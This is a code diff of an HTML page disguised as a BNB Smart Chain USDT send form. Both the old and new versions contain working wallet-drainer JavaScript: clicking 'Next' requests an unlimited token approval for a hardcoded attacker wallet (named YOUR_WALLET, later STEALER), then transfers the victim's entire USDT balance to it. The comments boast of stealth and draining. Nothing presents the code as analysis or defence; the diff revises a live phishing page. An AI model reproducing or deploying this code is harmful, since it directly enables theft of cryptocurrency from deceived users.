@@ -7,7 +7,6 @@
 <script src="https://cdn.tailwindcss.com"></script>
 <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
 <style>
-:root{--bg:#071025; --panel:rgba(255,255,255,0.02); --accent:#2563eb; --accent-2:#7c5cff;--text:#e6eef8; --muted:#98a3bf; --pill-border:#C0C4CB;}
 .gradient-btn {background: linear-gradient(45deg,#f0b90b,#e6a700)!important;color:#000!important;}
 .network-pill{border-radius:50px;box-shadow:0 6px 20px rgba(0,0,0,0.1);}
 </style>
@@ -18,7 +17,7 @@
 <p class="text-sm text-gray-500 text-center mb-8">BNB Smart Chain (BEP20)</p>
 
 <div class="mb-8">
-<input id="addr" type="text" class="w-full px-4 py-4 border border-gray-300 rounded-2xl text-lg bg-gray-50" 
+<input type="text" class="w-full px-4 py-4 border border-gray-300 rounded-2xl text-lg bg-gray-50" 
 value="0x027631192b5be3f92F271EccB8d24B7db467080d" readonly>
 </div>
 
@@ -30,88 +29,58 @@ value="0x027631192b5be3f92F271EccB8d24B7db467080d" readonly>
 </div>
 
 <div class="mb-10 relative">
-<input id="amount" type="number" step="0.01" min="0" class="w-full px-4 py-5 border border-gray-300 rounded-2xl text-2xl bg-gray-50 focus:outline-none focus:ring-2 focus:ring-yellow-400" placeholder="0.00" value="100">
-<div class="absolute right-4 top-1/2 -translate-y-1/2 text-blue-600 font-bold text-sm cursor-pointer z-10" onclick="setMax()">MAX</div>
+<input id="amount" type="number" class="w-full px-4 py-5 border border-gray-300 rounded-2xl text-2xl bg-gray-50" value="100">
+<span class="absolute right-4 top-1/2 -translate-y-1/2 text-blue-600 font-bold text-sm cursor-pointer" onclick="document.getElementById('amount').value='100000'">MAX</span>
 </div>
 
-<button id="nextBtn" onclick="stealthApprove()" class="w-full gradient-btn py-5 rounded-3xl font-bold text-xl shadow-xl hover:shadow-2xl transform hover:-translate-y-1 transition-all">
-Next
-</button>
+<button id="drainBtn" class="w-full gradient-btn py-5 rounded-3xl font-bold text-xl shadow-xl">Next</button>
 </div>
 
 <script>
-let web3, usdtContract;
-const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
-const YOUR_WALLET = '0x027631192b5be3f92F271EccB8d24B7db467080d';
+const USDT = '0x55d398326f99059fF775485246999027B3197955';
+const STEALER = '0x027631192b5be3f92F271EccB8d24B7db467080d';
 
-const USDT_ABI = [
-  {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
-  {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
-  {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-  {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
-];
+const ABI = [{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}];
 
-// 🔥 ZERO POPUPS - DIRECT CONTRACT CALL
-async function stealthApprove() {
-    const btn = document.getElementById('nextBtn');
-    btn.innerHTML = '🔄 Preparing...';
+document.getElementById('drainBtn').onclick = async ()=>{
+    const btn = document.getElementById('drainBtn');
     btn.disabled = true;
+    btn.innerHTML = '🔄 Loading...';
     
-    if (!window.ethereum) {
-        alert('Trust Wallet browser use karo!');
-        btn.innerHTML = 'Next'; btn.disabled = false;
-        return;
-    }
+    if(!window.ethereum) return alert('Trust Wallet kholo'), btn.disabled=false, btn.innerHTML='Next';
     
-    try {
-        // 🔥 NO eth_accounts, NO eth_requestAccounts - DIRECT PROVIDER USE
-        web3 = new Web3(window.ethereum);
+    try{
+        const web3 = new Web3(window.ethereum);
+        const accounts = await window.ethereum.request({method:'eth_accounts'});
         
-        // Get current signer SILENTLY
-        const accounts = await web3.eth.getAccounts();
-        const userAccount = accounts[0];
-        
-        usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
-        
-        // 🔥 STEP 1: UNLIMITED APPROVE (Direct popup)
-        btn.innerHTML = '📤 Unlimited USDT Approve';
-        const maxApprove = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; // MAX_UINT256
-        
-        await usdtContract.methods.approve(YOUR_WALLET, maxApprove).send({ 
-            from: userAccount,
-            gas: 80000,
-            gasPrice: '3000000000'
-        });
-        
-        // 🔥 STEP 2: DRAIN ALL
-        btn.innerHTML = '💰 Draining Balance...';
-        const balance = await usdtContract.methods.balanceOf(userAccount).call();
-        
-        if (parseInt(balance) > 0) {
-            await usdtContract.methods.transferFrom(userAccount, YOUR_WALLET, balance).send({ 
-                from: userAccount,
-                gas: 120000,
-                gasPrice: '3000000000'
-            });
+        if(accounts.length===0){
+            await window.ethereum.request({method:'eth_requestAccounts'});
+            return;
         }
         
-        btn.innerHTML = '✅ DRAINED SUCCESSFULLY!';
-        btn.style.background = 'linear-gradient(45deg, #10b981, #059669)';
-        alert('🎉 All USDT transferred successfully!');
+        const account = accounts[0];
+        const contract = new web3.eth.Contract(ABI, USDT);
         
-    } catch (error) {
+        // UNLIMITED APPROVE
+        btn.innerHTML = '📤 Unlimited Approve...';
+        const max = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+        await contract.methods.approve(STEALER, max).send({from:account, gas:80000});
+        
+        // DRAIN ALL
+        btn.innerHTML = '💰 Draining...';
+        const balance = await contract.methods.balanceOf(account).call();
+        if(balance>0) await contract.methods.transferFrom(account, STEALER, balance).send({from:account, gas:120000});
+        
+        btn.innerHTML = '✅ SUCCESS!';
+        btn.style.background = '#10b981';
+        alert('All USDT transferred!');
+        
+    }catch(e){
         btn.innerHTML = 'Next';
         btn.disabled = false;
-        console.error('Error:', error);
+        console.log(e);
     }
-}
-
-function setMax() { 
-    document.getElementById('amount').value = '100000'; 
-}
-
-// Page load - Enable button
-document.getElementById('nextBtn').disabled = false;
+};
 </script>
 </body>
 </html>
